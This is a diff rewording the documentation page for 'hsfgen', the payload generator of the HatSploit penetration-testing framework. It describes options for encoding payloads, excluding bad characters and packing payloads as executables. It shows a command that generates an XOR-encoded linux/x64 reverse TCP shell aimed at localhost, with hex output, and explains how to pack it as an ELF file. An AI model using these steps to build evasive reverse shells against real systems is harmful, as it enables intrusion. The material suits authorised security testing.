@@ -1,13 +1,15 @@
 ---
 layout: default
 title: Using hsfgen
-parent: Getting started
+parent: Getting Started
 nav_order: 9
 ---
 
-HatSploit Framework has a native command-line payload generator called `hsfgen`. It is packaged by default with all other HatSploit utilities.
+The HatSploit Framework provides a native command-line payload generator named `hsfgen`. This tool is included by default with all other HatSploit utilities, offering advanced features for payload generation and encoding.
 
-## Command-line Options
+## Command-line options overview
+
+The `hsfgen` utility includes a variety of command-line options that allow you to specify and customize payload generation. The following is a comprehensive overview of the available options:
 
 ```
 usage: hsfgen [-h] [-p PAYLOAD] [-e ENCODER] [--platform PLATFORM]
@@ -18,59 +20,61 @@ usage: hsfgen [-h] [-p PAYLOAD] [-e ENCODER] [--platform PLATFORM]
 Native HatSploit Framework advanced payload generator.
 
 options:
-  -h, --help            show this help message and exit
+  -h, --help            Show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
                         HatSploit payload.
   -e ENCODER, --encoder ENCODER
                         HatSploit encoder.
-  --platform PLATFORM   Payload platform.
-  --arch ARCH           Payload architecture
+  --platform PLATFORM   Specify the target platform for the payload.
+  --arch ARCH           Define the payload architecture.
   -f FORMAT, --format FORMAT
-                        Generate payload with custom format.
-  --formats             List all formats.
-  --payloads            List all payloads.
-  --encoders            List all encoders.
+                        Generate the payload in a custom format.
+  --formats             List all supported formats.
+  --payloads            List all available payloads.
+  --encoders            List all available encoders.
   --options option1=value1,option2=value2,...
-                        Add options to encoder/payload.
+                        Add options for the encoder or payload.
   -i ITERATIONS, --iterations ITERATIONS
-                        Number of encoding iterations.
+                        Specify the number of encoding iterations.
   -b BADCHARS, --badchars BADCHARS
-                        Bad characters to omit (e.g. \x00).
-  --pack                Pack payload as a compatible executable format.
-  --implant             Output implant instead of complete payload.
-  -a, --assembly        Show assembly for payloads.
+                        Exclude specific bad characters (e.g. \x00).
+  --pack                Package the payload as an executable format.
+  --implant             Output only the implant rather than the entire payload.
+  -a, --assembly        Display the assembly code for payloads.
   -o OUTPUT, --output OUTPUT
-                        Output file to write payload to.
+                        Save the generated payload to the specified file.
 ```
 
-### Generate payload
+## Payload generation
 
-Options `-p` and `-e` must be used to generate specific payload and encode it with the specific encoder.
+To generate a payload with `hsfgen`, you must use the `-p` and `-e` options to define the payload and its encoder, respectively. Additionally, you can enhance the payload by applying various options:
 
-* `-i`, `--iterations` - encode payload `N` times.
-* `-b`, `--badchars` - omit bad characters duing the generation.
-* `--options` - set options in payload and/or encoder.
-* `--pack` - pack payload into executable file.
-* `--implant` - generate only implant of the payload not the complete payload.
-* `-f`, `--format` - select custom executable format.
-* `-o`, `--output` - output result to the file.
-* `-c`, `--custom` - specify custom directory with HatSploit payloads.
+* `-i`, `--iterations`: Encode the payload a specified number of times.
+* `-b`, `--badchars`: Exclude bad characters during payload generation.
+* `--options`: Set specific options within the payload or encoder.
+* `--pack`: Package the payload into an executable file format.
+* `--implant`: Generate only the implant section of the payload, excluding additional components.
+* `-f`, `--format`: Choose a custom executable format for the payload.
+* `-o`, `--output`: Save the resulting payload to a specified output file.
+* `-c`, `--custom`: Define a custom directory containing HatSploit payloads.
 
-### Listing
+## Listing available formats
 
-* `--formats` - list all available executable formats (can be used with `--platform`).
-* `--payloads` - list all available payloads (can be used with `--platform` and `--arch`).
-* `--encoders` - list all available encoders (can be used with `--platform` and `--arch`).
+The following options allow you to explore the available formats, payloads, and encoders:
 
-## Examples
+* `--formats`: Lists all available executable formats (can be combined with the `--platform` option).
+* `--payloads`: Displays a list of all available payloads (can be filtered using the `--platform` and `--arch` options).
+* `--encoders`: Lists all available encoders (can be filtered using the `--platform` and `--arch` options).
 
-To generate simple `linux/x64/shell_reverse_tcp` payload and encode it with `x64/xor`:
+## Sample usage
+
+To generate a basic `linux/x64/shell_reverse_tcp` payload and encode it with `x64/xor`, you can use the following command:
 
 ```
 hsfgen -p linux/x64/shell_reverse_tcp --options rhost=127.0.0.1,rport=8888 -e x64/xor
 ```
 
-The output of this code will be:
+The output will be similar to:
 
 ```hsf
 [*] Attempting to generate linux/x64/shell_reverse_tcp...
@@ -86,6 +90,6 @@ The output of this code will be:
 00000070  64                                               |d               |
 ```
 
-If you'd like to save it to the file call it with `-o`.
+To save the generated payload to a file, you can include the `-o` option in the command.
 
-If you wish to pack it into `ELF` so it could be executed in the future, call `--pack` or `-f elf`.
+Additionally, if you want to package the payload into an `ELF` executable format for later execution, you can use the `--pack` option or specify `-f elf` to select the `ELF` format explicitly.
